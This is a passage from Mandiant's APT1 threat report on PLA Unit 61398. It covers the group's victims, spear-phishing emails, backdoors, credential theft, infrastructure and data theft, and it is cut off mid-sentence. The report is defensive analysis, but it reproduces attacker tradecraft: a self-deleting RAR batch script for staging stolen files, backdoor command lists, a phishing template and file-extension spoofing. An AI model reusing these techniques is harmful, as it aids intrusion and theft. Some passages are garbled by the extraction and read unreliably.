national defense construction is important.” The letter also appears to indicate that this is a special consideration being
made outside of China Telecom’s “normal renting method” for Unit 61398.Additionally, the memo clarifies the phrase
“Unit 61398” with the comment “(GSD 3rd Department, 2nd Bureau).” The memo not only supports the identity
of Unit 61398 as GSD’s 3rd Department 2nd Bureau, but also reveals the relationship between a “very important
communication and control department” (Unit 61398) and a state-influenced enterprise.Address: 上海市浦东新区大同路118弄甲 (Pudong New Area, Shanghai, Datong Road 118 A)
	
        Building Name: 中国人民解放军第61398部队司令部 (People’s Liberation Army Unit 61398 Headquarters)
    	
        Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%
        91%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%BB%A4%E9%83%A8_0,
        accessed February 6, 2013.Address: 上海市浦东新区高桥镇大同路135号 (Pudong New Area, Shanghai Gaoqiao Town, Datong Road 135)
	
        Building Name: 中国人民解放军第61398部队 (People’s Liberation Army Unit 61398)
    	
        Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9
        1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F_0, accessed February 6, 2013.Address: 上海市浦东新区高桥镇大同路153号 (Pudong New Area, Shanghai Gaoqiao Town, Datong Road 153)
    	
        Building Name: 中国人民解放军第61398部队 (People’s Liberation Army Unit 61398)
    	
        Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9
        1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F, accessed February 6, 2013.Address: 上海市浦东新区大同路305号 (Pudong New Area, Shanghai, Datong Road 305)
    	
        Building Name: 中国人民解放军第61398部队后勤部 (Logistics Department of the Chinese People’s Liberation Army Unit 61,398)(
    	
        Chinese phone book listing building name and address; http://114.mingluji.com/category/%E7%B1%B-
        B%E5%9E%8B/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%91%E8%A7%A3%E6%94%BE%E5%86%9B?page=69, accessed
        February 6, 2013.23	
        Unit 61398 Kindergarden Listed in Shanghai Pudong: http://www.pudong-edu.sh.cn/Web/PD/jyzc_school.aspx?SiteID=45&UnitID=2388
  James C. Mulvenon and Andrew N. D. Yang, editors, The People’s Liberation Army as Organization: Reference Volume v1.0, (Santa Monica, CA:
24	

RAND Corporation, 2002), 125, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed February 6, 2013.This bureau already placed fiber-optic cable at the
          East Gate front entrance [road pole].They need to use two ports to enter our company’s
          East Gate communication channel.The length is about 30m.At the same time, the second
          stage construction (in Gaoqiao Base) needs to enter into our company’s Shanghai Nanhui
          Communication Park 005 Center (special-use bureau).This military fiber-optic cable has
          already been placed at the Shanghai Nanhui Communication Park entrance.They need to use
          4 of our company ports inside the Nanhui Communication Park to enter.The length is 600m.Upon our division’s negotiation with the 3rd Department 2nd Bureau’s communication branch,
          the military has promised to pay at most 40,000 Yuan for each port.They also hope Shanghai
          Telecom will smoothly accomplish this task for the military based on the principle that national
          defense construction is important.After checking the above areas’ channels, our company has a
          relatively abundant inventory to satisfy the military’s request.This is our suggestion: because this is concerning defense construction, and also the 3rd
          Department 2nd Bureau is a very important communication control department, we agree to
          provide the requested channels according to the military’s suggested price.Because this is a
          one-time payment, and it is difficult to use the normal renting method, we suggest our company
          accept one-time payment using the reason of “Military Co-Construction [with China Telecom] of
          Communication Channels” and provide from our inventory.The military’s co-building does not
          interfere with our proprietary rights.If something breaks, the military is responsible to repair it
          and pay for the expenses.After you agree with our suggestion, we will sign an agreement with
          the communication branch of 61398 and implement it.Please provide a statement about whether the above suggestion is appropriate or not.[Handwritten Note]Agree with the Market Department Examining Control Affairs Division
          suggestion; inside the agreement clearly [...define?(illegible) ...] both party’s responsibilities.The sheer scale and
duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this
campaign.We will demonstrate that the nature of APT1’s targeted victims and the group’s infrastructure and tactics
align with the mission and infrastructure of PLA Unit 61398.Remarkably, we have witnessed APT1 target dozens of
                            organizations simultaneously.We believe that the extensive activity we have directly
                            observed represents only a small fraction of the cyber espionage that APT1 has
                            committed.<footnote>
                            26	
                               Figure 10 shows that we have seen APT1 compromise an increasing number of organizations each
                            year, which may reflect an increase in APT1’s activity.However, this increase may also simply reflect
                        Mandiant’s expanding visibility into APT1’s activities as the company has grown and victims’ awareness
                            of cyber espionage activity in their networks has improved.</footnote>

<footer>
Mandiant APT1	                                         20	                                                  www.mandiant.com
</footer>
 
Once APT1 has compromised a network, they repeatedly monitor and steal proprietary data and communications from the victim for months or even years.For the organizations in Figure 10, we found that APT1 maintained access to the victim’s network for an average of 356 days.<fn>27</fn> The longest time period APT1 maintained access to a victim’s network was at least 1,764 days, or four years and ten months.APT1 was not continuously active on a daily basis during this time period; however, in the vast majority of cases we observed, APT1 continued to commit data theft as long as they had access to the network.<box>
Longest time period within
which APT1 has continued
to access a victim’s network:
4 Years, 10 Months
</box>
</section>

<section>
<heading>APT1’s Geographic & Industry Focus</heading>
The organizations targeted by APT1 primarily conduct their operations in English.However, we have also seen the
group target a small number of non-English speaking victims.A full 87% of the APT1 victims we have observed are
headquartered in countries where English is the native language (see Figure 11).This includes 115 victims located
in the U.S. and seven in Canada and the United Kingdom.Of the remaining 19 victims, 17 use English as a primary
language for operations.These include international cooperation and development agencies, foreign governments
in which English is one of multiple official languages, and multinational conglomerates that primarily conduct their
business in English.Only two victims appear to operate using a language other than English.Given that English-
language proficiency is required for many members of PLA Unit 61398, we believe that the two non-English speaking
victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities.<footnote>
27	
    This is based on 91 of the 141 victim organizations shown.In the remaining cases, APT1 activity is either ongoing or else we do not have visibility
into the last known date of APT1 activity in the network.In the case of victims with a multinational presence, the
location shown reflects either the branch of the organization that APT1 compromised (when known), or else is the
location of the organization’s headquarters.</caption>

APT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of
industries virtually simultaneously.Figure 12 provides a view of the earliest known date of APT1 activity against all of
the 141 victims we identified, organized by the 20 major industries they represent.The results suggest that APT1’s
mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous
range of industries on a continuous basis.Since the organizations included in the figure represent only the fraction
of APT1 victims that we confirmed directly, the range of industries that APT1 targets may be even broader than our
findings suggest.Further, the scope of APT1’s parallel activities implies that the group has significant personnel and technical resources
at its disposal.In the first month of 2011, for example, Figure 12 shows that APT1 successfully compromised 17
new victims operating in 10 different industries.Since we have seen that the group remains active in each victim’s
network for an average of nearly a year after the initial date of compromise, we infer that APT1 committed these 17
new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously
compromised victims.The dots within
each bar represent the earliest known date on which APT1 compromised a new organization within the industry.</caption>


<footer>
Mandiant APT1	                                                 23	                               www.mandiant.com
</footer>

We believe that organizations in all industries related to China’s strategic priorities are potential targets of APT1’s
comprehensive cyber espionage campaign.We determined each organization’s industry based on reviewing
its industry classification in the Hoover’s<fn>29</fn> system.We also considered the content of the data that APT1 stole in
each case, to the extent that this information was available.</caption>
</section>

<footnote>
28	
   Joseph Casey and Katherine Koleski, Backgrounder: China’s 12th Five-Year Plan, U.S.-China Economic & Security Review Commission (2011), 19, http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf, accessed February 3, 2013.29	
      http://www.hoovers.com/
</footnote>

<footer>
Mandiant APT1	                                                      24	                                                www.mandiant.com
</footer>

<section>
<heading>APT1 Data Theft</heading>
APT1 steals a broad range of information from its victims.It is often difficult for us to estimate how much data APT1 has stolen during their intrusions for several reasons:

»»    APT1 deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually
      overwritten during normal business activities.»»    Pre-existing network security monitoring rarely records or identifies the data theft.»»    The duration of time between the data theft and Mandiant’s investigation is often too great, and the trace evidence
      of data theft is overwritten during the normal course of business.»»    Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating
      and understanding the impact of the security breach.Even with these challenges, we have observed APT1 steal as much as 6.5 terabytes of compressed data from a
single organization over a ten-month time period.Given the scope of APT1’s operations, including the number of
organizations and industries we have seen them target, along with the volume of data they are clearly capable of stealing from any single organization, APT1 has likely stolen hundreds of terabytes from its victims.Although we do not have direct evidence indicating who receives the information that APT1 steals or how the recipient processes such a vast volume of data, we do believe that this stolen information can be used to obvious advantage by the PRC and Chinese state-owned enterprises.As an example, in 2008, APT1 compromised the network of a company involved in a wholesale industry.APT1 installed tools to create compressed file archives and to extract emails and attachments.Over the following 2.5 years, APT1 stole an unknown number of files from the victim and repeatedly accessed the email accounts of several executives, including the CEO and General Counsel.During this same time period, major news organizations reported that China had successfully
negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities.This
may be coincidental; however, it would be surprising if APT1 could continue perpetrating such a broad mandate of
cyber espionage and data theft if the results of the group’s efforts were not finding their way into the hands of entities
able to capitalize on them.<box>
Largest APT1 data theft
from a single organization:
6.5 Terabytes
over 10 months
</box>
</section>
<footer>
Mandiant APT1	                                                25	                                         www.mandiant.com
</footer>

<section>
<heading>APT1 In The News</heading>
Public reporting corroborates and extends our observations of APT1’s cyber espionage activity.However, several factors
complicate the process of compiling and synthesizing public reports on APT1.For one thing, information security
researchers and journalists refer to APT1 by a variety of names.In addition, many cyber security analysts focus on
writing about tools that are shared between multiple Chinese APT groups without differentiating between the various
actors that use them.To assist researchers in identifying which public reports describe the threat group that we identify as APT1, Table
3 provides a list of APT group nicknames that frequently appear in the media and differentiates between those that
describe APT1 and those that do not.In addition, below is a list of public reports about Chinese threat actors that we
have confirmed as referring to APT1.»»    The earliest known public report about APT1 infrastructure is a 2006 publication from the Japanese division of
      Symantec.<fn>30</fn> The report calls out the hostname sb.hugesoft.org, which is registered to an APT1 persona known as
      Ugly Gorilla (discussed later in this report).»»    In November 2012, Bloomberg’s Chloe Whiteaker authored a piece on a Chinese threat group called “Comment
      Group,” which described the various tools and domains used by APT1 persona Ugly Gorilla.<fn>34</fn>
</section>

<footnote>
30	
   Symantec, “Backdoor.Wualess,” Symantec Security Response (2007), http://www.symantec.com/ja/jp/security_response/print_writeup.jsp?docid=2006-101116-1723-99, accessed February 3, 2013.Brian Krebs, “Chinese Hackers Blamed for Intrusion at Energy Industry Giant Telvent,” Krebs on Security (2012) http://krebsonsecurity.31	

com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/, accessed February 3, 2013
  Reid Wightman, “Spear Phishing Attempt,” Digital Bond (2012), https://www.digitalbond.com/blog/2012/06/07/spear-phishing-attempt/, accessed
32	

February 3, 2013.Jaime Blasco, “Unveiling a spearphishing campaign and possible ramifications,” Alien Vault (2012), http://labs.alienvault.com/labs/index.33	

php/2012/unveiling-a-spearphishing-campaign-and-possible-ramifications/, accessed February 3, 2013.Chloe Whiteaker, “Following the Hackers’ Trail,” Bloomberg, (2012) http://go.bloomberg.com/multimedia/following-hackers-trail/, accessed
34	

February 3, 2013.</footnote>

<footer>
Mandiant APT1	                                                          26	                                                  www.mandiant.com
</footer>

<section>
                     <heading>APT 1 : Attack Lifecycle</heading>

APT1 has a well-defined attack methodology, honed over years and designed to steal massive quantities of intellectual
property.They begin with aggressive spear phishing, proceed to deploy custom digital weapons, and end by exporting
compressed bundles of files to China – before beginning the cycle again.They employ good English — with acceptable
slang — in their socially engineered emails.They have evolved their digital weapons for more than seven years,
resulting in continual upgrades as part of their own software release cycle.Their ability to adapt to their environment
and spread across systems makes them effective in enterprise environments with trust relationships.These attacks fit into a cyclic pattern of activity that we will describe in this section within the framework of Mandiant’s
Attack Lifecycle model.In each stage we will discuss APT1’s specific techniques to illustrate their tenacity and the
scale at which they operate.(See Appendix B: “APT and the Attack Lifecycle” for a high-level overview of the steps
most APT groups take in each stage of the Attack Lifecycle.)As with
most other APT groups, spear phishing is APT1’s most commonly used technique.The spear phishing emails contain
either a malicious attachment or a hyperlink to a malicious file.The subject line and the text in the email body are
usually relevant to the recipient.APT1 also creates webmail accounts using real peoples’ names — names that are
familiar to the recipient, such as a colleague, a company executive, an IT department employee, or company counsel
— and uses these accounts to send the emails.As a real-world example, this is an email that APT1 sent to Mandiant
employees:
<figure>
                         Date: Wed, 18 Apr 2012 06:31:41 -0700
                         From: Kevin Mandia <kevin.mandia@rocketmail.com>
                         Subject: Internal Discussion on the Press
                         Release

                         Hello,
                         Shall we schedule a time to meet next week?We need to finalize the press release.Details click here.Kevin Mandia
</figure>

<caption>Figure 15: APT1 Spear Phishing Email</caption>

At first glance, the email appeared to be from Mandiant’s CEO, Kevin Mandia.However, further scrutiny shows that
the email was not sent from a Mandiant email account, but from “kevin.mandia@rocketmail.com”.Rocketmail is a
free webmail service.The account “kevin.mandia@rocketmail.com” does not belong to Mr. Mandia.Rather, an APT1
actor likely signed up for the account specifically for this spear phishing event.If anyone had clicked on the link that
day (which no one did, thankfully), their computer would have downloaded a malicious ZIP file named “Internal_
Discussion_Press_Release_In_Next_Week8.zip”.This file contained a malicious executable that installs a custom APT1
backdoor that we call WEBC2-TABLE.<footer>
Mandiant APT1	                                             28	                                        www.mandiant.com
</footer>

Although the files that APT1 actors attach or link to spear phishing emails are not always in ZIP format, this is the
predominant trend we have observed in the last several years.@
                                                                           
                                           Spear Phishing Email
                                             with Attachment               
             APT 1
                                                                           
                                                   Is this for real?@                                      
             APT 1                                                         


                                                    Okay, thanks!“It’s legit.”                !@


             APT 1

</figure>
<caption>Figure 16: APT1’s interaction with a spear phishing recipient</caption>

The example file names include military, economic, and diplomatic themes, suggesting the wide range of industries that APT1 targets.Some names are also generic (e.g., “updated_office_contact_v1.zip”) and could be used for targets in any industry.On some occasions, unsuspecting email recipients have replied to the spear phishing messages, believing they were communicating with their acquaintances.In one case a person replied, “I’m not sure if this is legit, so I didn’t open it.” Within 20 minutes, someone in APT1 responded with a terse email back: “It’s legit.”

<footer>
Mandiant APT1	                                                     29	                                  www.mandiant.com
</footer>
  
  <figure>
        Would you click on this?Some APT1 actors have gone to the trouble of making the malicious software inside their ZIP files look
        like benign Adobe PDF files.Here is an example:




        This is not a PDF file.It looks like the filename has a PDF extension but the file name actually includes
        119 spaces after “.pdf” followed by “.exe” — the real file extension.APT1 even went to the trouble of
        turning the executable’s icon to an Adobe symbol to complete the ruse.However, this file is actually a
        dropper for a custom APT1 backdoor that we call WEBC2-QBP.</figure>
</section>

<section>
<heading>Establishing A Foothold</heading>
Establishing a foothold involves actions that ensure control of the target network’s systems from outside the network.APT1 establishes a foothold once email recipients open a malicious file and a backdoor is subsequently installed.A
backdoor is software that allows an intruder to send commands to the system remotely.In almost every case, APT
backdoors initiate outbound connections to the intruder’s “command and control” (C2) server.APT intruders employ
this tactic because while network firewalls are generally adept at keeping malware outside the network from initiating
communication with systems inside the network, they are less reliable at keeping malware that is already inside the
network from communicating to systems outside.We have documented 42 families of
backdoors in “Appendix C: The Malware Arsenal” that APT1 uses that we believe are not publicly available.In addition
we have provided 1,007 MD5 hashes associated with APT1 malware in Appendix E. We will describe APT1’s backdoors
in two categories: “Beachhead Backdoors” and “Standard Backdoors.”
</section>


<footer>
Mandiant APT1	                                              30	                                         www.mandiant.com
</footer>

<section>
<heading>Beachhead Backdoors</heading>

Beachhead backdoors are typically minimally                        
featured.They offer the attacker a toe-hold to                    
perform simple tasks like retrieve files, gather                   
basic system information and trigger the                           
execution of other more significant capabilities                   
such as a standard backdoor.APT1’s beachhead backdoors are usually                             
what we call WEBC2 backdoors.WEBC2                                
backdoors are probably the most well-known                        
kind of APT1 backdoor, and are the reason                          
why some security companies refer to APT1                          
as the “Comment Crew.” A WEBC2 backdoor                            
is designed to retrieve a webpage from a C2
server.It expects the webpage to contain               
special HTML tags; the backdoor will attempt            
to interpret the data between the tags as                
commands.Older versions of WEBC2 read                   
data between HTML comments, though over                 
time WEBC2 variants have evolved to read                
data contained within other types of tags.From direct observation, we can confirm
that APT1 was using WEBC2 backdoors as
early as July 2006.However, the first compile time<fn>35</fn> we have for WEBC2-KT3 is 2004-01-23, suggesting that APT1
has been crafting WEBC2 backdoors since early 2004.Based on the 400+ samples of WEBC2 variants that we have
accumulated, it appears that APT1 has direct access to developers who have continually released new WEBC2 variants
for over six years.<box>
What is a malware family?A malware family is a collection of malware in which each sample shares a significant amount of code with all of the others.To help illustrate this, consider the following example from the physical world.There is now a vast array of computing tablets for sale.These include Apple’s iPad, Samsung’s Galaxy Tab, and Microsoft’s Surface.Although these are all tablet computers, “under the hood” they are probably quite different.However, one can expect that an iPad 1 and an iPad 2 share a significant number of components — much more than, say, an iPad 1 and a Microsoft Surface.Thus it makes sense to refer to the iPad “family” and the Surface “family”.When it comes to computer programs, in general if they share more than 80% of the same code we consider them part of the same family.There are exceptions: for example, some files contain public and standard code libraries that we do not take into consideration when making a family determination.The compile
35	

date is easily accessible in the PE header of the resulting executable file unless the intruder takes additional steps to obfuscate it.</footnote>

<footer>
Mandiant APT1	                                                        31	                                                 www.mandiant.com
</footer>

A “build path” discloses the directory from which the programmer
built and compiled his source code.These samples, compiled 2.5              
years apart, were compiled within a folder named “work\code\...\                 
mywork”.The instances of “work” suggest that working on WEBC2 is                                   
                                                                          
someone’s day job and not a side project or hobby.Furthermore, the
Sample A build string includes “2012-2-23” — which matches Sample
A’s compile date.The Sample B build string lacks “2012-2-23” but
includes “2009-8-7” — which also matches Sample B’s compile date.This suggests that the code used to compile Sample A was modified
from code that was used to compile Sample B 2.5 years previously.The     
existence of “2008-7-8” suggests that the code for both samples was
modified from a version that existed in July 2008, a year before Sample
B was created.This series of dates indicates that developing and
modifying the WEBC2 backdoor is an iterative and long-term process.WEBC2 backdoors typically give APT1 attackers a short and
rudimentary set of commands to issue to victim systems, including:
»» Open an interactive command shell (usually Windows’ cmd.exe)                                     
»» Download and execute a file                                                                      
»» Sleep (i.e.remain inactive) for a specified amount of time            

WEBC2 backdoors are often packaged with spear phishing emails.Once installed, APT1 intruders have the option to tell victim systems             
                                                                                                   
to download and execute additional malicious software of their choice.WEBC2 backdoors work for their intended purpose, but they generally                                 
                                                                                  
                                                                          
have fewer features than the “Standard Backdoors” described below.graphical) interface                                               
                                                                                  
»» Harvest passwords                                                                                
»» Enumerate users                                                                                  
»» Enumerate other systems on the network                                                           
»» Sleep (i.e.APT1 has used and steadily modified BISCUIT since as early as 2007
and continues to use it presently.ljc                       Enumerate running processes and identify their owners.sjc <PID>|<NAME>          Terminate a process, either by process ID or by process name.upload <file>             Send a file to the C2 server
          zxdosml <input>           Send input to the command shell process (launched with “bdkzt”).</table>
These functions are characteristic of most backdoors, and are not limited to APT1 or even APT.For example, anyone
who wants to control a system remotely will likely put functions like “Upload/download files” into a backdoor.</section>

<section>
<heading>Covert Communications</heading>
Some APT backdoors attempt to mimic legitimate Internet traffic other than the HTTP protocol.Additionally, many of APT1’s backdoors use SSL encryption so that
communications are hidden in an encrypted SSL tunnel.We have provided APT1’s public SSL certificates in Appendix
F so people can incorporate them into their network signatures.</section>


<footer>
Mandiant APT1	                                            33	                                       www.mandiant.com
</footer>

<section>
<heading>Privilege Escalation</heading>
Escalating privileges involves acquiring items (most often usernames and passwords) that will allow access to more
resources within the network.In this and the next two stages, APT1 does not differ significantly from other APT
intruders (or intruders, generally).APT1 predominantly uses publicly available tools to dump password hashes from
victim systems in order to obtain legitimate user credentials.One way to do this would be to store the person’s actual password
    on the system that the person is trying to access, and to compare the typed password to the stored password.Although simple, this method is also very insecure: anyone who can access that same system will be able to
    see the person’s password.Instead, systems that verify passwords usually store password hashes.In simple
    terms, a password hash is a number that is mathematically generated from the person’s password.The
    mathematical methods (algorithms) used to generate password hashes will create values that are unique for
    all practical purposes.When a person supplies their password, the computer generates a hash of the typed
    password and compares it to the stored hash.If they match, the passwords are presumed to be the same and
    the person is allowed to log in.It is supposed to be impossible to “reverse” a hash to obtain the original password.However, it is possible with
    enough computational resources to “crack” password hashes to discover the original password.(“Cracking”
    generally consists of guessing a large number of passwords, hashing them, and comparing the generated
    hashes to the existing hashes to see if any match.)Intruders will steal password hashes from victim systems
    in hopes that they can either use the hashes as-is (by “passing-the-hash”) or crack them to discover users’
    passwords.</box>
</section>

<section>
<heading>Internal Reconnaissance</heading>
In the Internal Reconnaissance stage, the intruder collects information about the victim environment.Like most APT
(and non-APT) intruders, APT1 primarily uses built-in operating system commands to explore a compromised system
and its networked environment.Although they usually simply type these commands into a command shell, sometimes
intruders may use batch scripts to speed up the process.Figure 18 below shows the contents of a batch script that
APT1 used on at least four victim networks.</section>

<section>
<heading>Maintain Presence</heading>
In this stage, the intruder takes actions to ensure continued, long-term control over key systems in the network
environment from outside of the network.APT1 does this in three ways.1.Install new backdoors on multiple systems
Throughout their stay in the network (which could be years), APT1 usually installs new backdoors as they claim more
systems in the environment.Then, if one backdoor is discovered and deleted, they still have other backdoors they can
use.We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been
present for more than a few weeks.2.Use legitimate VPN credentials
APT actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user.We have observed APT1 using stolen usernames and passwords to log into victim networks’ VPNs when the VPNs are
only protected by single-factor authentication.From there they are able to access whatever the impersonated users are
allowed to access within the network.<footnote>
36	
      Mandiant uses the term “credentials” to refer to a userid and its corresponding, working password.</footnote>

<footer>
Mandiant APT1	                                                             36	                             www.mandiant.com
</footer>

3.Log in to web portals
Once armed with stolen credentials, APT1 intruders also attempt to log into web portals that the network offers.This
includes not only restricted websites, but also web-based email systems such as Outlook Web Access.</section>

<section>
<heading>Completing The Mission</heading>
Similar to other APT groups we track, once APT1 finds files of interest they pack them into archive files before stealing
them.APT intruders most commonly use the RAR archiving utility for this task and ensure that the archives are
password protected.Sometimes APT1 intruders use batch scripts to assist them in the process, as depicted in Figure
19.(The instances of “XXXXXXXX” obfuscate the text that was in the actual batch script.)<figure>
             @echo off
             cd /d c:\windows\tasks
             rar.log a XXXXXXXX.rar -v200m “C:\Documents and Settings\Place\My
             Documents\XXXXXXXX” -hpsmy123!@#
             del *.vbs
             del %0
</figure>

<caption>Figure 19: An APT1 batch script that bundles stolen files into RAR archive files</caption>

After creating files compressed via RAR, the APT1 attackers will transfer files out of the network in ways that are
consistent with other APT groups, including using the File Transfer Protocol (FTP) or their existing backdoors.Many
times their RAR files are so large that the attacker splits them into chunks before transferring them.Figure 19 above
shows a RAR command with the option “-v200m”, which means that the RAR file should be split up into 200MB
portions.<figure>


                                                                        .rar

</figure>


<caption>Figure 20: APT1 bundles stolen files into RAR archives before moving data to China</caption>



<footer>
Mandiant APT1	                                             37	                                         www.mandiant.com
</footer>

Unlike most other APT groups we track, APT1 uses two email-stealing utilities that we believe are unique to APT1.The
first, GETMAIL, was designed specifically to extract email messages, attachments, and folders from within Microsoft
Outlook archive (“PST”) files.Microsoft Outlook archives can be large, often storing years’ worth of emails.They may be too large to transfer out
of a network quickly, and the intruder may not be concerned about stealing every email.The GETMAIL utility allows
APT1 intruders the flexibility to take only the emails between dates of their choice.In one case, we observed an APT1
intruder return to a compromised system once a week for four weeks in a row to steal only the past week’s emails.Whereas GETMAIL steals email in Outlook archive files, the second utility, MAPIGET, was designed specifically to steal
email that has not yet been archived and still resides on a Microsoft Exchange Server.In order to operate successfully,
MAPIGET requires username/password combinations that the Exchange server will accept.MAPIGET extracts email
from specified accounts into text files (for the email body) and separate attachments, if there are any.<heading>English As A Second Language</heading>
APT1’s “It’s legit” email should not mislead someone into thinking that APT1 personnel are all fluent in English, though
some undoubtedly are.Their own digital weapons betray the fact that they were programmed by people whose first
language is not English.Here are some examples of grammatically incorrect phrases that have made it into APT1’s
tools over the years.<caption>Table 7: Examples of grammatically incorrect phrases in APT1 malware</caption>
<table>
 Phrase                                                                   Tool                    Compile date
 If use it, key is the KEY.GETMAIL                 2005-08-18
 Wether encrypt or not,Default is NOT.GETMAIL                 2005-08-18
 ToolHelp API isn’t support on NT versions prior to Windows 2000!LIGHTDART               2006-08-03
 No Doubt to Hack You, Writed by UglyGorilla                              MANITSME                2007-09-06
 Type command disable.Go on!HELAUTO                 2008-06-16
 File no exist.Simple Downloader       2008-11-26
                                                                          (not profiled)
 you specify service name not in Svchost\netsvcs, must be one of following  BISCUIT                 2009-06-02
 Can not found the PID                                                     WEBC2 (Uncat)           2009-08-11
 Doesn’t started!GREENCAT                2009-08-18
 Exception Catched                                                         MACROMAIL               2010-03-15
 Are you sure to FORMAT Disk C With NTFS?(Y/N)                             TABMSGSQL               2010-11-04
 Shell is not exist or stopped!TARSIP                  2011-03-24
 Reqfile not exist!COOKIEBAG               2011-10-12
 the url no respon!COOKIEBAG               2011-10-12
 Fail To Execute The Command                                               WEBC2-TABLE             2012-02-23

</table>
</section>
<footer>
Mandiant APT1	                                             38	                                         www.mandiant.com
</footer>
 
<section>  
    <heading>APT 1 : Infrastructure</heading>

APT1 maintains an extensive infrastructure of computers around the world.We have evidence suggesting that APT1
manually controls thousands of systems in support of their attacks, and have directly observed their control over
hundreds of these systems.Although they control systems in dozens of countries, their attacks originate from four large
networks in Shanghai — two of which are allocated directly to the Pudong New Area, the home of Unit 61398.The
sheer number of APT1 IP addresses concentrated in these Shanghai ranges, coupled with Simplified Chinese keyboard
layout settings on APT1’s attack systems, betrays the true location and language of the operators.To help manage the
vast number of systems they control, APT1 has registered hundreds of domain names, the majority of which also point
to a Shanghai locale.The domain names and IP addresses together comprise APT1’s command and control framework
which they manage in concert to camouflage their true origin from their English speaking targets.</section>

<section>
<heading>APT1 Network Origins</heading>
We are frequently asked why it is an ineffective security measure to just block all IP addresses in China from
connecting to your network.To put it simply, it is easy for APT1 attackers to bounce or “hop” through intermediary
systems such that they almost never connect to a victim network directly from their systems in Shanghai.Using their
immense infrastructure, they are able to make it appear to victims that an attack originates from almost any country
they choose.The systems in this type of network redirection infrastructure have come to be called “hop points”
or “hops.” Hop points are most frequently compromised systems that APT1 uses, in some instances for years, as
camouflage for their attacks without the knowledge of the systems’ owners.These systems belong to third-party victims
who are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data
and intellectual property.<figure></figure>


<caption>Figure 21: APT1 bounces through “hop point” systems before accessing victim systems</caption>



<footer>
Mandiant APT1	                                            39	                                        www.mandiant.com
</footer>

We have observed some of APT1’s activities after they cross into (virtual) U.S. territory.They access hop points using
a variety of techniques, the most popular being Remote Desktop and FTP.Over a two-year period (January 2011 to
January 2013) we confirmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different
IP addresses with Remote Desktop.Remote Desktop provides a remote user with an interactive graphical interface to
a system.The experience is similar to the user actually physically sitting at the system and having direct access to the
desktop, keyboard, and mouse.Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four
large net blocks in Shanghai which we will refer to as APT1’s home networks.The other 15 of the 832 IP addresses are registered to organizations in the U.S. (12), Taiwan (1), Japan (1) and Korea
(1).We have confirmed that some of these systems are part of APT1’s hop infrastructure and not legitimately owned
by APT1 — in other words, APT1 accessed one hop from another hop, as opposed to accessing the hop directly from
Shanghai.In order to make a user’s experience as seamless as possible, the Remote Desktop protocol requires client applications
to forward several important details to the server, including their client hostname and the client keyboard layout.In 1,849 of the 1,905 (97%) APT1 Remote Desktop sessions we observed in the past two years, the keyboard
layout setting was “Chinese (Simplified) — US Keyboard.” Microsoft’s Remote Desktop client configures this setting
automatically based on the selected language on the client system, making it nearly certain that the APT1 actors
managing the hop infrastructure are doing so with Simplified Chinese (zh-cn) input settings.“Simplified Chinese” is
a streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland
China.Taiwan and municipalities such as Hong Kong still use “Traditional Chinese” (zh-tw) character sets.The overwhelming concentration of Shanghai IP addresses and Simplified Chinese language settings clearly indicate
that APT1 intruders are mainland Chinese speakers with ready access to large networks in Shanghai.The only

<footer>
Mandiant APT1	                                             40	                                         www.mandiant.com
</footer>

alternative is that APT1 has intentionally been conducting a years-long deception campaign to impersonate Chinese
speakers from Shanghai in places where victims are not reasonably expected to have any visibility – and without
making a single mistake that might indicate their “true” identity.</section>

<section>
<heading>Interaction with Backdoors</heading>
As we just mentioned, APT1 attackers typically use hops to connect to and control victim systems.Victim backdoors
regularly connect out to hop points, waiting for the moment that the attacker is there to give them commands.However,
exactly how this works is often specific to the tools they are using.</section>

<section>
<heading>Manual WEBC2 updates</heading>
As covered in the previous “Attack Lifecycle” section, WEBC2 backdoor variants download and interpret data stored
between tags in HTML pages as commands.They usually download HTML pages from a system within APT1’s hop
infrastructure.We have observed APT1 intruders logging in to WEBC2 servers and manually editing the HTML pages
that backdoors will download.Because the commands are usually encoded and difficult to spell from memory, APT1
intruders typically do not type these strings, but instead copy and paste them into the HTML files.They likely generate
the encoded commands on their own systems before pasting them in to an HTML file hosted by the hop point.For
example, we observed an APT attacker pasting the string “czo1NA==” into an HTML page.That string is the base64-
encoded version of “s:54”, meaning “sleep for 54 minutes” (or hours, depending on the particular backdoor).In lieu
of manually editing an HTML file on a hop point, we have also observed APT1 intruders uploading new (already-edited)
HTML files.</section>

<section>
<heading>HTRAN</heading>
When APT1 attackers are not using WEBC2, they require a “command and control” (C2) user interface so they can
issue commands to the backdoor.This interface sometimes runs on their personal attack system, which is typically
in Shanghai.In these instances, when a victim backdoor makes contact with a hop, the communications need to be
forwarded from the hop to the intruder’s Shanghai system so the backdoor can talk to the C2 server software.We have
observed 767 separate instances in which APT1 intruders used the publicly available “HUC Packet Transmit Tool”
or HTRAN on a hop.As always, keep in mind that these uses are confirmed uses, and likely represent only a small
fraction of APT1’s total activity.The HTRAN utility is merely a middle-man, facilitating connections between the victim and the attacker who is using
the hop point.For example, the following command, which was issued by an
